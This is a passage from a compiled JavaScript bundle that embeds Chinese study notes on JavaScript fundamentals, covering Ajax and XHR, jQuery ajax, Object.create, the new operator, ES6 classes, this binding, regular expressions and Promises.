回调函数包裹或者说封装了程序的延续（continuation）\r\n- 代码变得更加难以理解、追踪、调试和维护\r\n\r\n### 顺序的大脑\r\n\r\n- 并行执行多个任务时，实际上极有可能是在进行快速的上下文切换\r\n- 异步事件并发机制很相似\r\n- JavaScript 程序中总是有很多噪声，使得代码更加杂乱回调地狱理解起来很难\r\n- 顺序阻塞式的大脑计划行为无法很好地映射到面向回调的异步代码\r\n\r\n### 信任问题\r\n\r\n- 控制反转 （inversion of control），也就是把自己程序一部分的执行控制交给某个第三方\r\n- 对于被传给你无法信任的工具的每个回调，你都将不得不创建大量的混乱逻辑\r\n- 回调最大的问题是控制反转，它会导致信任链的完全断裂\r\n- 没有应用某种逻辑来解决所有这些控制反转导致的信任问题\r\n那你的代码现在已经有了 bug\r\n\r\n### 省点回调\r\n\r\n- 为了更优雅地处理错误，有些 API 设计提供了分离回调 \r\n- 回调可以实现你想要的功能，但是要付出很多努力，代码也会变得笨重\r\n\r\n## ajax\r\n\r\n### Ajax\r\n\r\n- 请求\r\n\r\n\t- 流程\r\n\r\n\t\t- 1.创建浏览器内置的对象 XMLHttpRequest\r\n\t\t- 2.调用xhr对象的open方法，设置请求方式和请求的url\r\n\t\t- 3.调用xhr对象的send方法，向服务器发送请求\r\n\t\t- 4.当请求响应整个过程结束，然后接收服务器响应的结果（返回的数据）\r\n\r\n\t\t\t- 使用xhr的response属性来接收服务器响应的结果\r\n\r\n\t- 方式\r\n\r\n\t\t- get\r\n\r\n\t\t\t- 说明：一般用户从服务器获取数据\r\n\t\t\t- 参数：需要在设置url的时候将参数传递\r\n\r\n\t\t\t\t- 例子：?nam=xxx&sex=yyy\r\n\r\n\t\t\t- 缓存：\r\n\r\n\t\t\t\t- 说明：在get的请求方式下，IE浏览器会出现缓存现象\r\n\t\t\t\t- 解决办法：接收动态参数\r\n\r\n\t\t- post\r\n\r\n\t\t\t- 说明：把数据提交给服务器\r\n\t\t\t- 参数：需要在send发送请求处添加参数\r\n\r\n\t\t\t\t- 例子：xhr.send(\'name=zhangsan&age=18\')\r\n\r\n\t\t\t- 注意：\r\n\r\n\t\t\t\t- post会比get请求多一行代码：xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\')\r\n\r\n- 响应数据格式\r\n\r\n\t- JSON\r\n\r\n\t\t- 本质：字符串\r\n\t\t- 注意点：\r\n\r\n\t\t\t- 1.JSON 中属性名称必须用“双引号”包裹\r\n\t\t\t- 2.JSON 中表述字符串（值）必须使用双引号\r\n\t\t\t- 3.JSON 中不能有注释\r\n\t\t\t- 4.JSON 没有 undefined 这个值\r\n\r\n\t- XML\r\n\r\n\t\t-  可扩展标记语言\r\n\r\n\t\t\t- 1.只有一个根标签\r\n\t\t\t- 2.区分大小写\r\n\t\t\t- 3.标签必须闭合\r\n\t\t\t- 4.属性值必须加引号\r\n\r\n\t- HTML\r\n\r\n\t\t- 超文本标记语言\r\n\r\n- 模板引擎\r\n\r\n\t- 使用的原因：可以更容易更高效的将数据渲染到HTML字符串中\r\n\t- 使用步骤：\r\n\r\n\t\t- 1.引入template-web.js文件\r\n\t\t- 2.定义模板，一定要指定script的id和type属性\r\n\t\t- 3.调用template函数，为模板分配数据，template函数有两个参数一个返回值\r\n\t1）. 参数1：模板的id\r\n\t2）. 参数2：分配的数据，必须是一个JS对象的形式\r\n\t3）. 一个返回值：是数据和模板标签组合好的结果\r\n\r\n\t- 调用方式：\r\n\r\n\t\t- 普通流：var\r\n\t\t- 条件：if age > 18\r\n\t\t- 循环：each arr\r\n\r\n- 异步&同步\r\n\r\n\t- 同步\r\n\r\n\t\t- 例：一个人在同一个时刻只能做一件事情，在执行一些耗时的操作的时候，不能去做别的事，只是等待\r\n\r\n\t- 异步\r\n\r\n\t\t- 例：在执行一些耗时的操作的时候，同时去做别的事，而不是等待\r\n\r\n\t- xhr.open（请求参数，请求url，boolean） \r\n\r\n\t\t- 第三个参数即为false同步，true异步（默认）\r\n\r\n- XHR对象其他API\r\n\r\n\t- 1.readyState\r\n\r\n\t\t- 状态 xhr.readyState\r\n\r\n\t\t\t- 0\r\n\r\n\t\t\t\t- 代理（XHR）被创建，但尚未调用 `open()` 方法。\r\n\r\n\t\t\t- 1\r\n\r\n\t\t\t\t- open()` 方法已经被调用，建立了连接。\r\n\r\n\t\t\t- 2\r\n\r\n\t\t\t\t- send()` 方法已经被调用，并且已经可以获取状态行和响应头。\r\n\r\n\t\t\t- 3\r\n\r\n\t\t\t\t- 响应体（服务器返回的数据）下载中， `responseText` 属性可能已经包含部分数据。\r\n\r\n\t\t\t- 4\r\n\r\n\t\t\t\t- 响应体（服务器返回的数据）下载完成，可以直接使用 `responseText`或response 获取完整的结果。\r\n\r\n\t- 2.onreadystatechange\r\n\r\n\t\t- 1.每当XHR对象的状态发生变化的时候，就会触发这个事件\r\n\t\t- 2.xhr对象分块接收数据\r\n\r\n\t- 3.progress( 过程，进度)\r\n\r\n\t\t- 1.onload -- 当readyState等于4的时候触发。只有请求成功了才触发。\r\n\t\t- 2.onprogress -- 当readyState等于3的时候触发（数据正在返回途中的时候触发）\r\n\t\t- 3.onloadstart() -- 当开始发送请求的时候触发，要放到send之前\r\n\t\t- 4.onloadend() -- 当请求响应过程结束的时候触发。无论成功还是失败都会触发。\r\n\r\n\t- XHR对象的兼容方案\r\n\r\n\t\t- 解释：XMLHttpRequest 在老版本浏览器（IE5/6）中有兼容问题\r\n\t\t- 书写：var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject(\'Microsoft.XMLHTTP\')\r\n\r\n\t- responseType\r\n\r\n\t\t- 1.“”  -- 空，表示文本，\r\n\t\t- 2.text -- 文本\r\n\t\t- 3.json -- JSON格式数据\r\n\t\t- 4.document -- 文档对象\r\n\r\n- jQuery封装\r\n\r\n\t- 格式：\r\n\r\n\t\t-     $.ajax({\r\n     type: \'GET\', // 请求方式\r\n     url: \'/query-get\',\r\n     data: {id: 333, age: 666, name: \'zs\'}, // 发送给接口的数据，可以写成对象，jQuery内部会自动将对象转成字符串\r\n    dataType: \'json\', // 如同 responseType。\r\n    success: function (res) {\r\n        console.log(res);\r\n    }\r\n});\r\n\r\n\t- 常用参数：\r\n\r\n\t\t- cache: 设置ie浏览器的缓存问题， cache: false 不缓存\r\n\t\t- url：请求地址\r\n\t\t- type：请求方法，默认为 `get\r\n\t\t- dataType：预期服务端响应数据类型\r\n\t\t- contentType：请求体内容类型，如果是POST请求，默认 `application/x-www-form-urlencoded\r\n\t\t- data：（object|string）传递到服务端的数据\r\n\t\t- timeout：请求超时时间\r\n\t\t- beforeSend：请求发起之前触发\r\n\t\t- complete：请求完成触发（不管成功与否）\r\n\t\t- success：请求成功之后触发（响应状态码 200）\r\n\t\t- error：请求失败触发\r\n\t\t- processData：是否让jQuery帮我们将发送给服务器的数据进行处理（默认：true表示将对象处理成字符串）\r\n\r\n\t- 快捷方法\r\n\r\n\t\t- $.get(url, [data], [callback], [dataType])\r\n\t\t- $.post(url, [data], [callback], [dataType])\r\n\r\n\t- 全局事件处理\r\n\r\n\t\t- 语法：\r\n\r\n\t\t\t- $.ajaxSetup({事件: 处理函数, 事件:处理函数, ...});\r\n\r\n\t\t- 示例\r\n\r\n\t\t\t- // 设置全局事件处理\r\n$.ajaxSetup({\r\n    // 设置发送请求前的事件\r\n    beforeSend: function () {\r\n        // 这里可以提示，玩命加载中...\r\n    },\r\n    // 设置完全接收响应数据后的事件\r\n    complete: function () {\r\n        // 这里可以去掉“玩命加载中...”\r\n    }\r\n});\r\n\r\n- FormData对象\r\n\r\n\t- 说明：主要用于表单发送数据\r\n\t- 使用方式：\r\n\r\n\t\t- 例如：var form = $(\'form\').get(0);\r\n          var fd = new FormData(form);\r\n\r\n\t- 注意事项：\r\n\r\n\t\t- 使用FormData的时候，form表单中的各项必须有name属性。没有name属性是收集不到数据的\r\n\r\n- 补充知识点：\r\n\r\n\t- 1.?id=457 问怎么可以拿到457\r\n 答：str.replace(/\\D/g,""); 使用正则将非数字剔除掉\r\n\t- 2.location.search  返回/设置当前的url的查询部分\r\n\t- 3.confirm（“你确定么”） 返回boolean\r\n\t- 4.console.log（）会在浏览器控制台打印出信息\r\n   console.dir（）可以显示一个对象所有的方法和属性\r\n\r\n## 一些容易混淆的小概念\r\n\r\n### undefined 与 not defined\r\n\r\n- 例子\r\n\r\n\t- 在c语言里面，会去严格区分声明(declared)和定义(defined),而在JS里，is not defined却会让人误以为是声明了没有定义的变量，但是实际上，却是没有声明，这个地方用ReferenceError: b is not declared\r\n\r\n- 理解\r\n\r\n\t- 某开发者想要声明两个变量，一个值类型为number的A,一个值类型为string的B，他在程序里写了\r\n\r\n\t- 这个时候实际上就是变量A去\'继承\'了type为\'undefined\'的值，B没有声明,现在就不知道继承哪种值，称为undeclared\r\n\r\n\t- 这个时候这位开发者写入\r\n\r\n\t- 那么就变成了\r\n\r\n\t- 所以此时typeof A会得到’number’，B目前存在于开发者的脑子里，所以为undeclared\r\n\r\n### 为什么[] == ![]为true？\r\n\r\n- （1）首先![] 转换为false，此时比较[] == false\r\n- （2）[]是对象，false转换为number，就是0，此时比较[] == 0;\r\n- （3）[] == 0将[]转换为字符串，就是"" == 0，然后""转换为字符串，就是0 == 0，即最终为true\r\n- == 的转换机制，先调用valueof，不行再调用toString\r\n\r\n### 手写原生Ajax请求\r\n\r\n- Ajax请求\r\n\r\n\t- 在这里， 我们创建了一个能向服务器发出 HTTP 请求的类的实例。然后调用其 open 方法，其中第一个参数是 HTTP 请求方法，第二个参数是请求页面的 URL。第三个参数是true（异步）或 false（同步）；最后，我们调用参数为 null 的 send 方法。假如使用 POST 请求方法（这里我们使用了 GET），那么 send 方法 的参数应该包含任何你想发送的数据。\r\n\r\n- 处理响应\r\n\r\n### Object.create 的模拟实现\r\n\r\n- 将传入的对象作为创建的对象的原型\r\n- 详解Object.create(null)\r\n\r\n\t- Object.create()的定义\r\n\r\n\t\t- Object.create(proto,[propertiesObject])\r\n\t\t- proto:新创建对象的原型对象\r\n\t\t- propertiesObject:可选。要添加到新对象的可枚举（新添加的属性是其自身的属性，而不是其原型链上的属性）的属性。\r\n\r\n\t- Object.creat()的使用\r\n\r\n\t- Object.create()、{…}的区别\r\n\r\n\t\t- 先看看我们经常使用的{}创建的对象是什么样子的\r\n\r\n\t\t\t- 在chrome控制台打印如下\r\n\r\n\t\t\t- 新创建的对象继承了Object自身的方法，如hasOwnProperty、toString等，在新对象上可以直接使用。\r\n\r\n\t\t- 再看看使用Object.create()创建对象\r\n\r\n\t\t\t- Object.creat(null)\r\n\r\n\t\t\t\t- 在chrome控制台打印如下\r\n\r\n\t\t\t\t- 新创建的对象除了自身属性a之外，原型链上没有任何属性，也就是没有继承Object的任何东西，此时如果我们调用o.toString()会报Uncaught TypeError的错误。\r\n\r\n\t\t\t- Object.creat({})\r\n\r\n\t\t\t\t- 在chrome控制台打印如下\r\n\r\n\t\t\t\t- 这样创建的对象和使用{}创建对象已经很相近了，但是还是有一点区别：多了一层proto嵌套。\r\n\r\n\t\t\t-  Object.create(Object.prototype)\r\n\r\n\t\t\t\t- chrome控制台打印如下\r\n\r\n\t- Object.create(null)的使用场景\r\n\r\n\t\t- 进一步比较一下Object.create(null)和{}创建控对象的区别\r\n\r\n\t\t- 使用场景\r\n\r\n\t\t\t- 使用create创建的对象，没有任何属性，显示No properties，我们可以把它当作一个非常纯净的map来使用，我们可以自己定义hasOwnProperty、toString方法，不管是有意还是不小心，我们完全不必担心会将原型链上的同名方法覆盖掉。\r\n\r\n\t\t- 举个例子\r\n\r\n\t\t- 另一个使用create(null)的理由是，在我们使用for..in循环的时候会遍历对象原型链上的属性，使用create(null)就不必再对属性进行检查了，当然，我们也可以直接使用Object.keys[]。\r\n\r\n\t- 总结\r\n\r\n\t\t- 你需要一个非常干净且高度可定制的对象当作数据字典的时候；\r\n\t\t- 想节省hasOwnProperty带来的一丢丢性能损失并且可以偷懒少些一点代码的时候\r\n\t\t- 其他时候，请用{}\r\n\r\n### New 关键字的内部实现\r\n\r\n- 当我们使用 new 操作符时，生成的实例对象拥有了 _proto_属性。在 new 的过程中，新对象被添加了 _proto_ 并且链接到构造函数的原型上。\r\n\r\n- New()的过程\r\n\r\n\t- （1）新生成了一个对象\r\n\t- （2）链接到原型\r\n\t- （3）绑定 this\r\n\t- （4）返回新对象\r\n\r\n- New()的实现\r\n\r\n\t- 最初版\r\n\r\n\t\t- 代码\r\n\r\n\t\t- 理解\r\n\r\n\t\t\t- （1）用new Object() 的方式新建了一个对象 obj\r\n\t\t\t- （2）取出第一个参数，就是我们要传入的构造函数。此外因为 shift 会修改原数组，所以 arguments 会被去除第一个参数\r\n\t\t\t- （3）将 obj 的原型指向构造函数，这样 obj 就可以访问到构造函数原型中的属性\r\n\t\t\t- （4）使用 apply，改变构造函数 this 的指向到新建的对象，这样 obj 就可以访问到构造函数中的属性\r\n\t\t\t- （5）返回 obj\r\n\r\n\t- 完整版\r\n\r\n\t\t- 起源\r\n\r\n\t\t\t- 如果构造函数有返回值\r\n\r\n\t\t\t\t- 返回值是对象\r\n\r\n\t\t\t\t\t- 构造函数返回了一个对象，在实例 person 中只能访问返回的对象中的属性。\r\n\r\n\t\t\t\t- 返回值是基本类型\r\n\r\n\t\t\t\t\t- 结果完全颠倒过来，这次尽管有返回值，但是相当于没有返回值进行处理。\r\n\r\n\t\t- 还需要判断返回的值是不是一个对象，如果是一个对象，我们就返回这个对象，如果没有，我们该返回什么就返回什么。\r\n\r\n### js 中的 !! 与 ~~\r\n\r\n- !!\r\n\r\n\t- 将操作数转化为布尔类型。\r\n\r\n\t- 实际上等效于 Boolean 被当做函数调用的效果\r\n\r\n- ~~\r\n\r\n\t- 将操作数转化为 32 位有符号整数。\r\n\r\n\t- 如果你需要将一个参数转化为 32 位有符号整数，那么 ~~ 将是最简便的方式。不过要切记，它会损失精度，包括小数和整数部分。\r\n\t- 按位非操作符~\r\n\r\n\t\t- 作用是将数值比特位中的 1 变成 0，0 变成 1。\r\n',$r={data:function(){return{MainComponent:Wr}}},Gr=$r,Vr=Object(u["a"])(Gr,Jr,zr,!1,null,"79d73b6a",null),Qr=Vr.exports,Kr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Xr=[],Yr="# js2\r\n\r\n## JavaScript 高级\r\n\r\n### 编程思想：\r\n\r\n- 面向过程：\r\n\r\n\t- 什么是面向过程？\r\n\r\n\t\t- 面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候再一个一个的依次调用就可以了\r\n\r\n\t- 优缺点：\r\n\r\n\t\t- 优点：性能比面向对象高，步骤练习紧密\r\n\t\t- 缺点：不好维护，不易多次使用及扩展\r\n\r\n- 面向对象：\r\n\r\n\t- 什么是面向对象？\r\n\r\n\t\t- 面向对象是把事务分解成为一个个对象，然后由对象之间分工与合作\r\n\r\n\t- 三大特性：\r\n\r\n\t\t- 1.封装性\r\n\t\t- 2.继承性\r\n\t\t- 3.多态性\r\n\r\n\t- 优缺点：\r\n\r\n\t\t- 优点：易维护，可复用，可扩展，灵活性高\r\n\t\t- 缺点：性能没有面向过程高\r\n\r\n### 类和对象\r\n\r\n- ES6\r\n\r\n\t- 对象\r\n\r\n\t\t- 什么是对象？\r\n\r\n\t\t\t- 对象是具体的\r\n\r\n\t- 类\r\n\r\n\t\t- 什么是类？\r\n\r\n\t\t\t- 类模拟抽象的，泛指的\r\n\r\n\t\t- 创建类\r\n\r\n\t\t\t- 例：class 类名 {\r\n                                                }      类名首字母要大些\r\n\r\n\t\t- constructor构造函数\r\n\r\n\t\t\t- 例：class Star {\r\n\tconstructor (uname,age){\r\n\t\tthis.uname = uname;\r\n\t\tthis.age = age;\r\n\t}\r\n}\r\n\r\n\t\t\t\t- 注意：1.类里面的方法不带function，直接写既可\r\n\t\t\t\t- 2.类中定义属性，调用方法都得用this\r\n\t\t\t\t- 3.方法之间不能加逗号分隔\r\n\r\n\t\t- 继承：\r\n\r\n\t\t\t- extends\r\n\r\n\t\t- super关键字：\r\n\r\n\t\t\t- 用于访问和调用对象父类上的函数\r\n\r\n\t\t\t\t- 注意：子类在构造函数中使用super, 必须放到this 前面(必须先调用父类的构造方法,在使用子类构造方法）\r\n\r\n\t\t- 三个比较重要的注意点：\r\n\r\n\t\t\t- 在ES6中类没有变量提升，所以必须先定义类，才能通过类实例化对象.\r\n\t\t\t- 类里面的共有属性和方法一定要加this使用.\r\n\t\t\t- this指向的问题\r\n\r\n\t\t\t\t- 方法里面的this，谁调用，this就代表谁\r\n\t\t\t\t- 构造方法里面的this，代表当前实例对象\r\n\r\n- ES5\r\n\r\n\t- 成员\r\n\r\n\t\t- 1.静态成员\r\n\r\n\t\t\t- 不需要实例对象调用属性（不需要new）\r\n\r\n\t\t- 2.实例成员\r\n\r\n\t\t\t- 需要实例对象调用属性（需要new）\r\n\r\n\t- 构造函数原型（prototype 原型对象-构造函数的一个属性）\r\n\r\n\t\t- 1.所有的属性都要写在构造函数里面\r\n\t\t- 2.所有的方法都要写在原型对象里面\r\n\r\n\t- 对象原型:简称“原型”（__proto__）\r\n\r\n\t\t- 1.每一个对象都有一个原型\r\n\t\t- 2.作用是指向原型对象prototype\r\n\r\n\t- 构造函数 constructor\r\n\r\n\t\t- 作用：指回原来的构造函数\r\n\r\n\t- 继承：\r\n\r\n\t\t- 属性继承\r\n\r\n\t\t\t- call(this,m,n)-------m,n为不确定参数，参数个数可变\r\n\r\n\t\t- 方法继承\r\n\r\n\t\t\t- 原理：1.子类的原型对象 《=》父类的实例对象\r\n\t\t\t- 2.继承完毕之后，子类的constructor的指向已经不见，需要将子类的custructor手动指回\r\n\r\n### 函数\r\n\r\n- 声明方式\r\n\r\n\t- 1.命名函数\r\n\r\n\t\t- function fn（）{}\r\n\r\n\t- 2.匿名函数\r\n\r\n\t\t- var fn = function(){}\r\n\r\n\t- 3.new function函数\r\n\r\n\t\t- var fn = new Function('a', 'b', 'console.log(a + b)')\r\n\r\n- 调用：\r\n\r\n\t- 1.普通函数\r\n\r\n\t\t- function fn() {\r\n\tconsole.log('人生的巅峰');\r\n}\r\nfn();\r\n\r\n\t- 2.对象的方法\r\n\r\n\t\t- var o = {\r\n  sayHi: function() {\r\n  \tconsole.log('人生的巅峰');\r\n  }\r\n}\r\no.sayHi();\r\n\r\n\t- 3.构造函数\r\n\r\n\t\t- function Star() {};\r\nnew Star();\r\n\r\n\t- 4.绑定事件函数\r\n\r\n\t\t- btn.onclick = function(){}\r\n\r\n\t- 5.定时器函数\r\n\r\n\t\t- setInterval(function() {}, 1000); \r\n\r\n\t\t\t- 注意：非定时器的代码要快于定时器代码（即使定时器代码时间为0）\r\n\r\n\t- 6.立即执行函数(自调用函数)\r\n\r\n\t\t- (function (){\r\n\tconsole.log('自调函数');\r\n})();\r\n\r\n- this\r\n\r\n\t- 指向\r\n\r\n\t\t- 1.普通函数\r\n\r\n\t\t\t- window\r\n\r\n\t\t- 2.对象函数\r\n\r\n\t\t\t- 该方法所属的对象\r\n\r\n\t\t- 3.构造函数\r\n\r\n\t\t\t- new出来的实例对象\r\n\r\n\t\t- 4.绑定事件函数\r\n\r\n\t\t\t- 事件源，绑定时间对象\r\n\r\n\t\t- 5.定时器函数\r\n\r\n\t\t\t- window\r\n\r\n\t\t- 6.立即执行函数（自调用函数）\r\n\r\n\t\t\t- window\r\n\r\n\t- 改变指向\r\n\r\n\t\t- 1.call（this，m，n…………）\r\n\r\n\t\t\t- 参数:\r\n\r\n\t\t\t\t- 参数使用，逗号分隔开\r\n\r\n\t\t\t- 应用场景:\r\n\r\n\t\t\t\t- 父子继承上面\r\n\r\n\t\t- 2.apply（this，[m，n…………]）\r\n\r\n\t\t\t- 参数：\r\n\r\n\t\t\t\t- 参数使用[] 数组包含上\r\n\r\n\t\t\t- 应用场景：\r\n\r\n\t\t\t\t- 常常跟数组有关系，例如：借助Math种的最大值，最小值，求出数组中的最大值，最小值\r\n\r\n\t\t- 3.bind（this，m，n…………）\r\n\r\n\t\t\t- 参数\r\n\r\n\t\t\t\t- 参数使用，逗号分隔开\r\n\r\n\t\t\t- 应用场景\r\n\r\n\t\t\t\t- 不调用函数，并且还想改变this的指向\r\n\r\n- 模式：\r\n\r\n\t- 正常模式：\r\n\t- 严格模式：\r\n\r\n\t\t- 1.声明：\r\n\r\n\t\t\t- “use strict”\r\n\r\n\t\t- 2.使用位置\r\n\r\n\t\t\t- 1.函数的顶端（使当前的函数声明为严格模式）\r\n\t\t\t- 2.脚本的顶端（是脚本声明为严格模式）\r\n\r\n\t\t- 3.注意事项\r\n\r\n\t\t\t- 1.变量\r\n\r\n\t\t\t\t- 1.变量声明中，必须加var\r\n\t\t\t\t- 2.不准删除变量\r\n\r\n\t\t\t- 2.this的指向：\r\n\r\n\t\t\t\t- 正常模式：\r\n\r\n\t\t\t\t\t- 在全局的作用域下，函数中的this，指向的是window\r\n\r\n\t\t\t\t- 严格模式：\r\n\r\n\t\t\t\t\t- 在全局的作用域下，函数中的this，是undefined\r\n\r\n\t\t\t- 3.函数变化\r\n\r\n\t\t\t\t- 1.函数不能有重复函数\r\n\t\t\t\t- 2.非函数体内不能含有函数体\r\n\r\n- 高阶函数：\r\n\r\n\t- 1.将函数当作值传入参数\r\n\t- 2.将函数当作返回值返回\r\n\r\n- 闭包\r\n\r\n\t- 一个作用域访问另一个作用域内的局部变量\r\n\r\n### 递归\r\n\r\n- 什么是？\r\n\r\n\t- 函数调用函数本身\r\n\r\n- 深拷贝与浅拷贝\r\n\r\n\t- 浅拷贝\r\n\r\n\t\t- 第一层：简单数据类型\r\n\r\n\t\t\t- 扩展：ES6新增方法Object.assign(“新的”，“源的”)\r\n\r\n\t- 深拷贝\r\n\r\n\t\t- 实现复杂类型的赋值，切记不能直接赋值，考虑复杂类型地址的问题\r\n\r\n- 补充知识：\r\n\r\n\t- instenceof 判断是不是数组或者对象\r\n\r\n### 正则表达式\r\n\r\n- 什么是？\r\n\r\n\t- 匹配字符串，检索，验证，表单验证\r\n\r\n- 创建方式\r\n\r\n\t- 1.var reg = new RegExp(/abc/)\r\n\t- 2.var reg = /abc/\r\n\r\n- 组成\r\n\r\n\t- 简单字符和特殊字符【元字符】\r\n\r\n- 边界符\r\n\r\n\t- n表示匹配行首的文本\r\n\t- $表示匹配行尾的文本\r\n\r\n- 中括号\r\n\r\n\t- 例：var reg = /^[abc]$/    也可以写成    var reg = /^[a|b|c]$/\r\n\r\n\t\t- a或b或c\r\n\t\t- 多选1\r\n\r\n\t- ^   这个需要注意一下：括号外边是边界符，里面是取反的意思\r\n\r\n- 量词符\r\n\r\n\t- *\r\n\r\n\t\t- 重复0次或者多次\r\n\r\n\t- .\r\n\r\n\t\t- 任意的\r\n\r\n\t- +\r\n\r\n\t\t- 最少一次\r\n\r\n\t- ？\r\n\r\n\t\t- 重复0次或者1次\r\n\r\n\t- {n}\r\n\r\n\t\t- 重复n次\r\n\r\n\t- {n，}\r\n\r\n\t\t- 重复n次或者更多次\r\n\r\n\t- {n，m}\r\n\r\n\t\t- 重复n到m次\r\n\r\n- 括号总结\r\n\r\n\t- 大括号\r\n\r\n\t\t- 量词符\r\n\r\n\t\t\t- 表示重复里面的次数\r\n\r\n\t- 中括号\r\n\r\n\t\t- 匹配括号中的任意字符\r\n\r\n\t- 小括号\r\n\r\n\t\t- 表示优先级\r\n\r\n## 一些重点问题\r\n\r\n### 【ES6】Promise解决了什么问题及使用\r\n\r\n- 【异步】Promise真正解决了什么？\r\n\r\n\t- 解决了回调地狱？\r\n\r\n\t\t- “回调地狱”所说的嵌套其实是指异步的嵌套。它带来了两个问题：可读性的问题和捕获错误问题。\r\n\r\n\t- 回调地狱的真正问题不是缩进\r\n\r\n\t\t- 可读性的问题\r\n\r\n\t\t\t- 代码逻辑书写顺序与执行顺序不一致，不利于阅读与维护。\r\n\t\t\t- 异步操作的顺序变更时，需要大规模的代码重构。\r\n\t\t\t- 回调函数基本都是匿名函数，bug 追踪困难。\r\n\r\n\t\t- 捕获错误问题\r\n\r\n\t\t\t- 控制反转\r\n\r\n\t\t\t\t- 在回调函数中，控制权被交给了第三方，由第三方决定什么时候调用回调以及如何调用回调。\r\n\r\n\t\t\t- 根本问题\r\n\r\n\t\t\t\t- 回调函数真正的问题是剥夺了程序员使用return和throw等捕捉错误和返回值的能力\r\n\t\t\t\t- 程序的执行流程是基于一个函数在执行过程中调用另一个函数时候会产生函数调用栈，而回调函数不是运行在栈上的，因此不能使用return和throw。\r\n\r\n\t\t\t- 代码的脆弱\r\n\r\n\t\t\t\t- 假设是这两个函数有顺序依赖的关系，我们要让A发生后B才执行，我们要把它们连接到一起的话只能手工硬编码\r\n\t\t\t\t- 这种方法会使得代码脆弱，你要在回调中捕获错误，必须在这个回调函数中创建大量逻辑来判断处理这些可能的情况，但这毫无疑问地会严重影响代码的可读性与开发效率。\r\n\r\n\t\t\t- 举例\r\n\r\n\t\t\t\t- 比如Ajax，可能会出现很多问题\r\n\r\n\t\t\t\t\t- 对于回调过早的问题\r\n\t\t\t\t\t- 对于回调过晚或没有调用的问题\r\n\t\t\t\t\t- 对于回调次数太少或太多的问题\r\n\r\n\t\t\t- 业界其他方案\r\n\r\n\t\t\t\t- （1）分离回调\r\n\r\n\t\t\t\t\t- 一个用于成功的处理函数，一个用于错误的处理函数！\r\n\r\n\t\t\t\t- （2）error-first风格，nodejs\r\n\r\n\t\t\t\t\t- 回调第一个参数作为错误对象(if exists)。 如果成功，error为 清空/置假 ，如果失败，if(err)为真。\r\n\r\n\t\t\t\t- 问题\r\n\r\n\t\t\t\t\t- 但这并没有解决 重复调用回调的问题。 你可能同时得到成功或失败的结果！ 或者都没有！ \r\n\t\t\t\t\t- 事实上：你需要额外的写更多的逻辑来处理回调过快或者失败或者太慢的问题， \r\n\r\n\t- 问题的解决\r\n\r\n\t\t- 如何解决可读性的问题\r\n\r\n\t\t\t- 链式调用相当于给了你一张可以把解题思路清晰记录下来的草稿纸，你不在需要用脑子去记忆执行顺序。\r\n\r\n\t\t- 如何解决捕获错误问题\r\n\r\n\t\t\t- Promise并没有取消控制反转，而是把反转出去的控制再反转一次，也就是反转了控制反转。\r\n\t\t\t- 与普通的回调的方式的区别\r\n\r\n\t\t\t\t- 普通的方式\r\n\r\n\t\t\t\t\t- 回调成功之后的操作直接写在了回调函数里面，而这些操作的调用由第三方控制。\r\n\r\n\t\t\t\t- Promise的方式\r\n\r\n\t\t\t\t\t- 回调只负责成功之后的通知，而回调成功之后的操作放在了then的回调里面，由Promise精确控制。\r\n\t\t\t\t\t- 反转控制反转\r\n\r\n\t\t\t\t\t\t- Promise 其实应验了 CS 的名言【所有问题都可以通过加一层中间层来解决】。在解决回调嵌套的问题中，Promise 就充当了一个中间层，用来【把回调造成的控制反转再反转回去】\r\n\r\n\t\t\t\t\t- 异步前后\r\n\r\n\t\t\t\t\t\t- 在使用 Promise 的例子中，控制流分为了两个部分：触发异步前的逻辑通过 new传入 Promise，而异步操作完成后的逻辑则传入 Promise 的 then 接口中。通过这种方式，第一方业务和第三方库的相应逻辑都由 Promise 来调用，进而在 Promise 中解决异步编程中可能出现的各种问题。\r\n\r\n\t\t\t\t\t- 接近观察者模式\r\n\r\n\t\t\t\t\t\t- 这种模式其实和观察者模式是接近的。下面的代码将 resolve / then 换成了 publish / subscribe ，将通过 new Promise 生成的 Promise 换成了通过 observe 生成的 observable 实例。可以发现，这种调用同样做到了回调嵌套的解耦。这就是 Promise 魔法的关键之一。\r\n\r\n\t\t\t- 解决传统回调的问题\r\n\r\n\t\t\t\t- 对于回调过早的问题\r\n\r\n\t\t\t\t\t- Promise不必担心，因为即使是立即完成的promise，对一个promise调用then的时候，即使这个promise已经resolution，提供给then的回调也总是异步调用的\r\n\t\t\t\t\t- 不需要setTimeout(,,0) hack, Promise不会导致竞态。\r\n\r\n\t\t\t\t- 对于回调过晚或没有调用的问题\r\n\r\n\t\t\t\t\t- Promise本身不会回调过晚，只要决议了，它就会按照规定运行。Promise创建对象调用resolve() 或reject() 的时候， 这个promise的then(…)注册的观察回调会被自动调度。 \r\n\t\t\t\t\t- 至于服务器或者网络的问题，并不是Promise能解决的，一般这种情况会使用Promise的竞态APIPromise.race加一个超时的时间\r\n\r\n\t\t\t\t\t\t- race()是一个解决如果Promise永远不能被resolved的解决方法\r\n\r\n\t\t\t\t- 对于回调次数太少或太多的问题\r\n\r\n\t\t\t\t\t- 回调被调用的正确次数应该是1。Promise的定义方式使得它只能被resolved 一次，如果处于某种原因。Promise创建的代码试图call resolve(…) or reject(..)多次， 那这个promise只会接收第一次resolved，并忽略后面的调用。 \r\n\r\n\t\t\t- Promise A+规范\r\n\r\n\t\t\t\t- 1. 如果promise被resolve，它要不是success就是failure，不可能同时存在。\r\n\t\t\t\t- 2. 一旦promise被resolve，它就再也不会被resolve(不会出现重复调用)。\r\n\t\t\t\t- 3. 如果promise返回了成功的信息，那么你绑定在成功事件上的回调会得到这个消息。\r\n\t\t\t\t- 4. 如果发生了错误，promise会收到一个带有错误信息的错误通知。\r\n\t\t\t\t- 5. 无论promise最后的结果是什么(success或者failure)，他就不会改变了，你总是可以获得这个消息只要你不销毁promise。\r\n\r\n- 【异步】Promise的使用以及了解\r\n\r\n\t- （1）了解 Promise 吗？\r\n\r\n\t\t- Promise 是异步编程的一种解决方案，比传统的异步解决方案【回调函数】和【事件】更合理、更强大。现已被 ES6 纳入进规范中。\r\n\r\n\t- （2）Promise 解决的痛点是什么？\r\n\r\n\t\t- 在 Promise 出现以前，我们处理一个异步网络请求，大概是这样：\r\n\r\n\t\t\t- 